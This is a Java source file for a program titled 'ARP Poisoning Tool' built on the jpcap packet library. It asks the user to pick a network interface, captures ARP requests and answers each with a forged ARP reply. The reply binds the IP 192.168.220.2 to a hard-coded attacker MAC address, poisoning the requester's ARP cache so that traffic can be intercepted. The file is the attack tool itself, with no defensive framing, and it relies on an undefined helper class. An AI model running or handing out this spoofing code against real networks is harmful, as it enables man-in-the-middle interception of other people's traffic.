import java.io.BufferedReader;   
import java.io.IOException;   
import java.io.InputStreamReader;   
import jpcap.JpcapCaptor;   
import jpcap.JpcapSender;   
import jpcap.NetworkInterface;   
import jpcap.NetworkInterfaceAddress;   
import jpcap.packet.ARPPacket;   
import jpcap.packet.EthernetPacket;  
import java.net.InetAddress; 
   
public class JARP implements Runnable   
{   
    
   static JpcapCaptor captor;   
   
   
   static JpcapSender sender;   
   
    
   static BufferedReader in = new BufferedReader(new InputStreamReader(System.in));   
   
   
    static NetworkInterface[] devices;   
   
      
     static ARPPacket p;   
      
      ARPPacket arp;   
   
    
      EthernetPacket ether;   
          
      
       static String str;   
   
   
       static int i=0;   
  public void run()   
              {   
        while(true)   
        {   
           
       
        p=(ARPPacket) captor.getPacket();   
           
        if(p != null && p.operation == 1)   
            {   
              System.out.println(p.toString());   
   
          
            byte[] mac_fake= new byte[] { (byte) 255, (byte)254 , (byte)253 , (byte)252, (byte)251 , (byte)250 };   
            byte[] srcip = new byte[] { (byte)192, (byte)168 , (byte)220 , (byte)2 };   
            byte[] mac_destination= p.sender_hardaddr;   
            byte[] destip = p.sender_protoaddr;   
            tab_mac.set_mac( mac_fake);  
            tab_mac.set_ip(srcip);
                         arp= new ARPPacket();   
   
               

                          arp.hardtype = ARPPacket.HARDTYPE_ETHER;   
              arp.prototype= ARPPacket.PROTOTYPE_IP;   
              arp.operation= ARPPacket.ARP_REPLY;   
              arp.hlen=6;   
              arp.plen=4;   
              arp.sender_hardaddr= tab_mac.get_mac_byte("00:0c:29:17:90:bb");   
              arp.sender_protoaddr= srcip;   
              arp.target_hardaddr= mac_destination;   
              arp.target_protoaddr= destip;   
             ether= new EthernetPacket();   
             ether.frametype= EthernetPacket.ETHERTYPE_ARP;   
             ether.src_mac= devices[0].mac_address;   
             ether.dst_mac= mac_destination;   
             arp.datalink= ether;   
             
             sender= captor.getJpcapSenderInstance();   
              
             sender.sendPacket(arp);   
               
               
            }   
        }   
               }   
                        
   public static int nic()   
           {   
                
             devices = JpcapCaptor.getDeviceList();   
   
        for(int i=0; i<devices.length; i++)   
                 {   
        System.out.println(i+  ":"+ devices[i].name +  "(" +devices[i].description + ")");   
           
       
                for(NetworkInterfaceAddress a: devices[i].addresses)   
        {   
        System.out.println("address:"+ a.address);   
        }          
        }   
        System.out.print("Choose the NIC you want to use");   
           
      
                 try       
        {   
          str= in.readLine();   
                 }catch(IOException e)   
            {   
              System.out.println(e.getMessage());   
            }   
        i=Integer.parseInt(str);   
        return i;   
          }   
   
   
  

 
   
   

      
 public static void main(String[] args)   
{   
    
 System.out.println(" ARP Poisoning Tool");   
     
     
    int j=nic();   
   
 
   
    try   
    {   
       captor = JpcapCaptor.openDevice(devices[j], 65535, true, 20);   
         }   
         catch(IOException e)   
          {   
           System.out.println( e.getMessage());   
           }   
   
          
         
          try   
      {   
        captor.setFilter("arp",true);   
           }   
           catch(IOException e)   
           {   
             System.out.println(e.getMessage());   
        }   
   
   
           Runnable runnable = new JARP();   
       
        
    Thread thread = new Thread(runnable);   
   
           
            thread.setName("JARP");   
   
          
        thread.setPriority(8);   
   
           
            thread.start();   
   
            
           
    
   
          
    
 
   
}   
   
    
   
   
}  